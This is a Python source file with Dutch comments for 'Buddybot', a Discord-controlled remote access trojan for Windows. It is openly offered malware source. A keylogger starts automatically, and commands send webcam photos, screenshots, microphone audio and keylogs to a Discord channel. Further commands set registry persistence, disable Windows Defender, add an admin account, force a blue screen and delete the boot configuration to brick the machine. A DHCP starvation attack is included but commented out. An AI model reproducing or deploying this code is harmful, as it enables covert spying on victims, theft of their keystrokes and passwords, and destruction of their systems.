# -----------------------------
# Dependencies importeren
# -----------------------------
# Standard libraries importeren (meegeleverd met Python)
import os
import asyncio
import threading
import subprocess
import winreg
import os
import sys

# Third-party imports (zelf  installeren met pip)
import discord  # pip install discord.py
from discord.ext import commands
from discord import app_commands
import cv2  # pip install opencv-python
import pyautogui  # pip install pyautogui
from pynput.keyboard import Listener, Key  # pip install pynput
import sounddevice as sd  # pip install sounddevice
from scipy.io.wavfile import write  # pip install scipy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC  # pip install scapy


# -----------------------------
# Bot API Configuratie
# -----------------------------

#resources:
DISCORD_TOKEN = "TOKENHERE"
GUILD_ID = 1468980945033105450
CHANNEL_ID = 1468981020975038575  # Kanaal waar bot berichten stuurt
STARTUP_CHANNEL_ID = 1468981020975038575  # Kanaal voor startup bericht
# ASCII art voor startup bericht
ASCII_ART = """ 
 _____                                                                    
|  ___|_ ___      ____      ____ _ ____                                     
| |_ / _` \ \ /\ / /\ \ /\ / / _` |_  /                                     
|  _| (_| |\ V  V /  \ V  V / (_| |/ /                                      
|_|__\__,_| \_/\_/    \_/\_/_\__,_/___|              _   _     _       _    
 ( _ )                   / ___|_ __ ___  _   _ _ __ | |_| |__ (_)_ __ | | __
 / _ \/\                | |  _| '__/ _ \| | | | '_ \| __| '_ \| | '_ \| |/ /
| (_>  <                | |_| | | | (_) | |_| | |_) | |_| | | | | | | |   < 
 \___/\/          _      \____|_|  \___/ \__,_| .__/ \__|_| |_|_|_| |_|_|\_
|  \/  |_   _ ___| |_ __ _ / _| __ _          |_|                           
| |\/| | | | / __| __/ _` | |_ / _` |                                       
| |  | | |_| \__ \ || (_| |  _| (_| |                                       
|_|  |_|\__,_|___/\__\__,_|_|  \__,_|   
                                    
Buddybot is wakker geworden, wat wil je doen? Gebruik /help voor de commandolijst.
"""
#Bot intents(nodig voor fuctionerende commando's en berichten).
intents = discord.Intents.default()
intents.message_content = True  # Bot mag berichten lezen (nodig voor sommige commando's).

#command prefix
bot = commands.Bot(command_prefix="/", intents=intents)

#Startup event. Bot stuurt een bericht met ASCII art. in de gespecificeerde channel(check de recources).
@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    channel = bot.get_channel(STARTUP_CHANNEL_ID)
    await channel.send(f"```\n{ASCII_ART}\n```")

    # Syncroniseren bot met de server (guild).
    guild = discord.Object(id=GUILD_ID)
    bot.tree.copy_global_to(guild=guild)
    await bot.tree.sync(guild=guild)

# -----------------------------
# /help command
# -----------------------------
@bot.tree.command(name="help", description="Toon de commandolijst")
async def help_command(interaction: discord.Interaction):
    await interaction.response.send_message(
        "🍳 **De Menukaart van Buddy**\n"
        "**🤖Bot Command's:**\n"
        "/help - laat dit bericht zien\n"
        "/ping - check of buddy online is\n"
        "**🛠️utilities:**\n"
        "/webcam - laat buddy een webcamfoto maken\n"
        "/screenshot - laat buddy een screenshot maken.\n"
        "/keydump - dump de automatisch verzamelde keylogs.\n"
        "/keyclear - verwijder de verzamelde keylogs\n"
        "/listen - luister mee via de microfoon (standaard 5 seconden)\n"
        "**🖥️Systeem commando's:**\n"
        "/persist - Permanente persistance activeren. \n"
        "/defender - Windows Defender uitschakelen (admin rechten vereist)\n"
        "/netscan - Local network discovery op de target. Doormiddel van ARP.\n"
        "**🤬Prankless harms:**\n"
        "/bsod - forceert een Blue Screen of Death\n"
        "/brick - verwijdert BCD en forceert shutdown. \n"
        "/dhcp_starve - DHCP starvation attack (disabled omdat geen killswitch)\n"
        "**🤔overig:**\n"
        "/addusr - voeg admin user toe aan windows\n"
    )
    
# -----------------------------
# /ping command
# -----------------------------
@bot.tree.command(name="ping", description="Check of Buddy online is")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message("🏓 Pong! Buddybot leeft.")

# -----------------------------
# Webcam module, commando: /webcam 
# -----------------------------
@bot.tree.command(name="webcam", description="Laat Buddy een webcamfoto maken")
async def webcam(interaction: discord.Interaction):
    await interaction.response.defer()  # Geeft bot tijd om te verwerken

    def capture_image():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False

        success, frame = cap.read()
        if success:
            cv2.imwrite("webcam.png", frame)

        cap.release()
        return success

    loop = asyncio.get_running_loop()
    success = await loop.run_in_executor(None, capture_image)

    if not success:
        await interaction.followup.send("❌ Webcam kon niet worden gebruikt.")
        return

    with open("webcam.png", "rb") as f:
        await interaction.followup.send(file=discord.File(f))

    os.remove("webcam.png")

# -----------------------------
# screenshot module, command: /screenshot
# -----------------------------
@bot.tree.command(name="screenshot", description="Laat Buddy een screenshot maken.")
async def screenshot(interaction: discord.Interaction):
    await interaction.response.defer()  # Geeft bot tijd om te verwerken

    # Screenshot nemen
    screenshot_image = pyautogui.screenshot()
    screenshot_image.save("screenshot.png")

    # Stuur naar Discord
    with open("screenshot.png", "rb") as f:
        await interaction.followup.send(file=discord.File(f))

    os.remove("screenshot.png")

# -----------------------------
# Keylogging module (gebeurt automatish op achtergrond.). /keydump en /keyclear commando's hieronder.
# -----------------------------
import threading
from pynput.keyboard import Listener, Key

# Logbestand locatie
log_file = "keylog.txt"

# Keylogger runt in background, en verzamelt automatisch toetsaanslagen.
def start_keylogger():
    def on_press(key):
        with open(log_file, "a") as f:
            try:
                # Formatting van speciale toetsen voor leesbaarheid
                k = str(key).replace("'", "")
                
                if "Key.space" in k:
                    f.write(" ")
                elif "Key.enter" in k:
                    f.write("\n")
                elif "Key" in k:
                    # Voor herkenbaarheid worden onbekende toetsen tussen vierkante haken gezet.
                    f.write(f" [{k.replace('Key.', '')}] ")
                else:
                    f.write(k)
            except Exception as e:
                pass

    # Dit stukje Start de listener. 
    with Listener(on_press=on_press) as listener:
        listener.join()

# Start de keylogger in een aparte thread
threading.Thread(target=start_keylogger, daemon=True).start()

# **Hieronder discord commando's voor de keylogger: /Keydump en /Keyclear.**

#commando /keydump
@bot.tree.command(name="keydump", description="Dump de verzamelde keylogs")
async def keydump(interaction: discord.Interaction):
    if os.path.exists(log_file):
        await interaction.response.send_message("Hier is de keylog dump (leesbaar formaat):", file=discord.File(log_file))
    else:
        await interaction.response.send_message("Nog geen logs gevonden.")

#commando /keyclear 
@bot.tree.command(name="keyclear", description="Verwijder de verzamelde keylogs")
async def keyclear(interaction: discord.Interaction):
    if os.path.exists(log_file):
        os.remove(log_file)
        await interaction.response.send_message("Logs zijn gewist.")
    else:
        await interaction.response.send_message("Geen bestand om te wissen.")

# -----------------------------
# listen module, commando: /listen
# -----------------------------

@bot.tree.command(name="listen", description="Luister mee via de microfoon")
async def listen(interaction: discord.Interaction, sec: int = 5):
    await interaction.response.defer()
    fs = 44100
    fn = "a.wav"
    
    # Opnemen en opslaan (In de achtergrond thread)
    def rec():
        r = sd.rec(int(sec * fs), samplerate=fs, channels=1, dtype='int16')
        sd.wait(); write(fn, fs, r)

    await asyncio.get_running_loop().run_in_executor(None, rec)
    
    with open(fn, "rb") as f:
        await interaction.followup.send(file=discord.File(f))
    os.remove(fn)

# -----------------------------
# Persistance. Commando: /persist. 
# -----------------------------
#deze code maakt de bot permanent persistent. De bot zal automatisch opstarten bij het opstarten van Windows.

@bot.tree.command(name="persist", description="Enable eenmalig de persistence van de bot.")
async def persist(interaction: discord.Interaction):
    # Pad naar dit script/exe en de naam in het register
    path = os.path.realpath(sys.argv[0])
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    try:
        # Open de 'Run' sleutel en voeg de waarde toe
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MyBotService", 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        await interaction.response.send_message("✅ Persistence succesvol ingesteld. Bot start automatisch op bij Windows boot.")
    except Exception as e:
        await interaction.response.send_message(f"❌ Fout bij instellen persistence: {e}")


# -----------------------------
# Defeat-Defender Commando: /defender. 
# -----------------------------
#Windows Defender uitschakelen.

@bot.tree.command(name="defender", description="Windows Defender uitschakelen")
async def defender(interaction: discord.Interaction):
    await interaction.response.defer()
    
    def ps(cmd):
        return subprocess.run(
            ["powershell", "-Command", cmd],
            capture_output=True,
            text=True
        )

    try:
        # Admin check
        if "True" not in ps(
            "([Security.Principal.WindowsPrincipal]"
            "[Security.Principal.WindowsIdentity]::GetCurrent()"
            ").IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
        ).stdout:
            await interaction.followup.send("Administratorrechten vereist.")
            return

        # Status controleren
        status = ps(
            "Get-MpComputerStatus | "
            "Select-Object -ExpandProperty RealTimeProtectionEnabled"
        ).stdout.strip()

        await interaction.followup.send(f"Realtime Protection status: {status}")

        # Uitschakelen
        ps("Set-MpPreference -DisableRealtimeMonitoring $true")
        await interaction.followup.send("Realtime Protection uitgeschakeld.")

    except Exception as e:
        await interaction.followup.send("Fout tijdens uitvoering.")
        await interaction.followup.send(str(e))


# -----------------------------
# netscan module, commando: /netscan 
# -----------------------------
    
@bot.tree.command(name="netscan", description="Netwerkscan via de target. Doormiddel van ARP.")
async def netscan(interaction: discord.Interaction):
    # Voert 'arp -a' uit om de lijst met apparaten in het netwerk op te halen
    data = subprocess.check_output("arp -a").decode('cp1252')
    
    # Slaat het op in een bestand voor Discord (voorkomt 2000-character error)
    with open("net.txt", "w") as f: f.write(data)
    await interaction.response.send_message(file=discord.File("net.txt"))
    os.remove("net.txt")


# -----------------------------
# DHCP Starvation module, commando: /dhcp_starve
# -----------------------------

@bot.tree.command(name="dhcp_starve" , description="DHCP starvation attack (disabled omdat geen killswitch).")
async def dhcp_starve(interaction: discord.Interaction):
    await interaction.response.send_message("❌ Commando onbeschikbaar")

#disabled omdat het nog geen killswitch heeft(gebruik op eigen risico).

#@bot.tree.command(name="dhcp_starve")
#async def dhcp_starve(interaction: discord.Interaction):
#    await interaction.response.send_message("🚀 Starvation gestart...")
#    def starve():
#        while True:
#            p = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=RandMAC())/DHCP(options=[("message-type", "discover"), "end"])
#            sendp(p, verbose=0)
#    threading.Thread(target=starve, daemon=True).start()



# -----------------------------
# Force BSOD Module, commando: /bsod
# -----------------------------  
 
#Forceert een Blue Screen of Death (BSOD).

@bot.tree.command(name="bsod" , description="Forceert een Blue Screen of Death (BSOD).")
async def bsod(interaction: discord.Interaction):
    await interaction.response.send_message("💀 BSOD...")
    os.system("taskkill /f /fi \"pid ne 0\" /im svchost.exe")

# -----------------------------
# Brick Module, commando: /brick
# -----------------------------   
#verwijdert de Boot Configuration Data (BCD) van Windows en forceert een shutdown.

@bot.tree.command(name="brick" , description="Verwijder BCD en forceer shutdown.")
async def brick(interaction: discord.Interaction):
    await interaction.response.send_message("👷Buddy is metselaar... Buddy houdt van bakstenen!!!🧱,\n,(BCD Verwijderd ✅ Buddy forceert shutdown...)")
    subprocess.run("bcdedit /delete {current}", shell=True)
    os.system("shutdown /s /t 0")

# -----------------------------
# Add User Module(admin user toevoegen), commando: /addusr 
# -----------------------------   
 
@bot.tree.command(name="addusr" , description="Voeg een admin user toe aan Windows.")
async def addusr(interaction: discord.Interaction, user: str = "Buddy", pw: str = "Buddy123!"):
    subprocess.run(f"net user {user} {pw} /add", shell=True)
    subprocess.run(f"net localgroup Administrators {user} /add", shell=True)
    await interaction.response.send_message(f"✅ {user} aangemaakt. Wachtwoord: {pw}")

# -----------------------------
# Bot verbinding.
# -----------------------------

#Run de bot. 
bot.run(DISCORD_TOKEN)
